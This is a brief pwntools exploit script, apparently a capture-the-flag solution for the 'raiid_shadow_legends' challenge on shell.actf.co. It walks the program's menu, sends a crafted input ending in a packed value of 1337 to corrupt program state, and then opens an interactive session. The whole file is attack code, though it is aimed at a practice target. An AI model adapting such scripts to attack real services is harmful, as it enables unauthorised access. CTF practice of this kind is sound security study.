from pwn import *

p=remote("shell.actf.co", 21300)
#p=process("./raiid_shadow_legends")

p.recv()
p.sendline("1")
p.recv()
p.sendline("yesa"+p32(1337))
p.recv()
p.sendline("yes")
p.recv()
p.sendline("1")
p.recv()
p.sendline("2")
p.recv()
p.sendline("2")

p.interactive()
